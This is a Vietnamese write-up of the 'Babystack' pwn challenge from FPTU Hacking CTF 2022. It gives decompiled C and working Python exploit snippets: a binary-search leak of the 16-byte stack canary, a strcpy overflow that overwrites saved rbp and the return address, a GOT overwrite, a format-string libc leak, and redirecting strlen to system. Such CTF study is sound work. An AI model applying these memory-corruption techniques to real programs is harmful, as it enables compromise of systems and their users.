# [Babystack - FPTU Hacking CTF 2022]
```C
#include <stdio.h>
#include <stdbool.h>


void timeout(void) {
    puts("Timeout");
                        /* WARNING: Subroutine does not return */
    exit(1);
}


int init() {
    int iVar1;

    signal(0xe, timeout);
    alarm(0x80);
    setvbuf(stdin, (char *)0x0, 2, 0);
    setvbuf(stdout, (char *)0x0, 2, 0);
    iVar1 = setvbuf(stderr, (char *)0x0, 2, 0);
    return iVar1;
}

void read_input(void *param_1, unsigned int param_2) {
    int iVar1;
    size_t sVar2;

    sVar2 = read(0, param_1, (unsigned long)param_2);
    iVar1 = (int)sVar2;
    if (iVar1 < 0) {
        puts("Read error");
        /* WARNING: Subroutine does not return */
        exit(-1);
    }
    if (*(char *)((long)param_1 + (long)iVar1 + -1) == '\n') {
        *(char *)((long)param_1 + (long)iVar1 + -1) = 0;
    }
    return;
}

int copy(char *dst, char *src) {
    int iVar1;
    char local_88[128];

    printf("Copy :");
    read_input(local_88, 0x3f);
    strcpy((char *)dst, local_88);
    iVar1 = puts("Your input was copied!");
    return iVar1;
}

undefined8 main() {
    int iVar1;
    char *src;
    char local_78[64];
    undefined8 local_38;
    undefined8 local_30;
    char local_28[28];
    int local_c;

    init();
    local_c = open("/dev/urandom", 0);
    read(local_c, &local_38, 0x10);
    password._0_8_ = local_38;
    password._8_8_ = local_30;
    close(local_c);
    while (true) {
        write(1, &DAT_001020bc, 2);
        src = local_28;
        read(0, src, 0x10);
        if (local_28[0] == (char)0x32)
            break;
        if (local_28[0] == (char)0x33) {
            if (logged_in == 0) {
                puts("You are not logged in");
            }
            else {
                copy(local_78, src);
            }
        }
        else if (local_28[0] == (char)0x31) {
            if (logged_in == 0) {
                login(&local_38);
            }
            else {
                logged_in = 0;
            }
        }
        else {
            puts("Invalid choice");
        }
    }
    if (logged_in == 0) {
        puts("I don\'t trust non-user");
        /* WARNING: Subroutine does not return */
        exit(0);
    }
    iVar1 = memcmp(&local_38, password, 0x10);
    if (iVar1 != 0) {
        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
    }
    return 0;
}

undefined8 check_password(long param_1, long param_2, int param_3) {
    undefined8 uVar1;
    int local_10;
    int local_c;

    local_c = 0;
    for (local_10 = 0; (local_10 < param_3 && (*(char *)(param_2 + local_10) != '\0'));
         local_10 = local_10 + 1) {
        local_c = local_c + ((unsigned int param_2) * (byte *)(param_2 + local_10) - (unsigned int param_2) * (byte *)(param_1 + local_10));
    }
    if (local_c == 0) {
        uVar1 = 1;
    }
    else {
        if (0 < local_c) {
            puts("Your password is too small!");
        }
        if (local_c < 0) {
            puts("Your password is too large!");
        }
        uVar1 = 0;
    }
    return uVar1;
}

void login(undefined8 param_1) {
    int iVar1;
    size_t sVar2;
    char local_88[128];

    printf("Your password:");
    read_input(local_88, 0x80);
    sVar2 = strlen(local_88);
    iVar1 = check_password(local_88, param_1, sVar2 & 0xffffffff);
    if (iVar1 == 0) {
        attempt = attempt + 1;
        if (0xe6 < attempt) {
            puts("Too many login attempts");
            /* WARNING: Subroutine does not return */
            exit(0);
        }
        puts("Failed !");
    }
    else {
        logged_in = 1;
        puts("Login Succeeded !");
    }
    return;
}
```
Checksec em nó xem:
![image](https://user-images.githubusercontent.com/54637811/176080985-b8f2372d-daa7-4c7c-aa34-0a08d0ef745f.png)

Phân tích thì bài này có 2 chức năng chính, login và copy, 1 số kết luận như sau:
* Đầu tiên nó đọc 16 bytes mật khẩu random rồi để trên bss và stack
* Login đoán đúng 16 bytes là ăn, nhưng nếu đọc kỹ hàm check_password thì chỉ cần login("\n") là được.
* Hàm check_password so sánh theo độ dài của input chứ không phải so sánh 16 bytes, dễ đến bị leak 1 số thống tin trên stack. 
* Hàm copy dùng `strcpy`, overflow là cái chắc. Để ý thì con trỏ input của hàm `login` là `[rbp-0x80]` và của hàm `copy` là `[rbp-0x80]`, nhưng hàm độ dài lớn nhất của input của hàm `copy` là 0x3f, còn `login` là 0x80. Tức là ta ghi đoạn payload cần overflow bằng hàm `login` xong đó dùng hàm `copy`. Hàm `copy` copy vào địa chỉ `[rbp-0x70]`, tức là ta ghi đè được old rbp và return address.
* Khi đăng nhập thì nó còn có 1 đoạn thông báo: `puts("Your password is too small!");` và `puts("Your password is too large!");`. Nghĩ ngay đến bruteforce trên stack, nhưng do giới hạn số lần đăng nhập sai nên viết thuật toán cẩn thận tý là ăn.
* 
Đây là đoạn leak 16 byte 
```python
leak_canary = b''
for i in range(16):
    low = 1
    high = 255
    
    while True:
        j = (low + high) // 2
        login(leak_canary+j.to_bytes(1, 'little')+b'\n')
        recv = r.recvline()
        if b'Login Succeeded !\n' == recv:
            leak_canary += j.to_bytes(1, 'little')
            logout()
            break
        elif b'Your password is too small!\n' == recv:
            low = j
        elif b'Your password is too large!\n' == recv:
            high = j
```

Tiếp theo là leak binary base. Ta thầy password ở [rbp-0x30], ta được phép ghi 10 byte vào [rbp-0x20], ở [rbp-0x18] có một địa chỉ của binary. Easy to leak
![image](https://user-images.githubusercontent.com/54637811/176096021-de3722d3-fd21-4b6e-8855-72f63b5d9f16.png)

Bắt đầu exploit:
```python
payload = b'a'*0x40 + leak_canary + b'a'*0x28 + p64(bin.address+0x14ad)[:-2]
login(payload)
login(b'\n')
copy(b'a')
logout()
```
Mục đích là ghi đè return address đến địa chỉ Base + 0x14ad, địa chỉ này nằm trong hàm `copy`. Tiếp theo sẽ là ghi đè old rbp để nó trỏ tới `bin.got['strcpy']+0x80`. Nhưng trước khi lặp lại bước trên, ta phải xóa 1 số chữ 'a' ở old rbp do bước trên.
```python
payload = b'a'*0x40 + leak_canary + b'a'*0x27 + b'\n'
r.sendafter(b'> ', b'1\n')
r.sendafter(b'Your password:', payload)
login(b'\n')
copy(b'a')
r.sendafter(b'> ', b'1\n')

payload = b'a'*0x40 + leak_canary + b'a'*0x20 + p64(bin.got['strcpy']+0x80)
r.sendafter(b'> ', b'1\n')
r.sendafter(b'Your password:', payload)
login(b'\n')
copy(b'a')
r.sendafter(b'> ', b'1\n')
```
Ok bây giờ thoát vòng lặp và chương trình sẽ return về địa chỉ Base + 0x14ad
![image](https://user-images.githubusercontent.com/54637811/176096882-604c214e-0ff9-43d0-9ccf-ca1d0e364ed1.png)

rbp đang bằng `bin.got['strcpy']+0x80`, do đó ta có thể ghi 0x39 bytes trên GOT
```python
payload = p64(bin.symbols['login']) + p64(bin.symbols['login']) + p64(bin.plt['write']+6) + \
        p64(bin.plt['printf']+6)
r.sendafter(b'Copy :', payload)
```
`strcpy`, `puts` sẽ thay bằng hàm `login`, `strlen` sẽ thay bằng printf để có **Format string**.
Luồng thực thi sẽ chạy tiếp đến hàm `strcpy` (đã bị ghi đè thành `login`). Trong hàm `login` sẽ nhận input và đưa vào `strlen`, ta sẽ leak được Libc
```python
payload = b'%4$p'.ljust(8, b'\x00') + p64(bin.symbols['copy'])
r.sendafter(b'Your password:', payload)
libc.address = int(r.recv(14), 16) - 0x5ed700
log.success('Libc base: %#x' % libc.address)
```

Hàm login sẽ gọi hàm puts, chúng ta sẽ có **Format string** vô hạn.
Kết thúc bài toán bằng đoạn payload ghi đè `strlen@got` thành địa chỉ `system`.
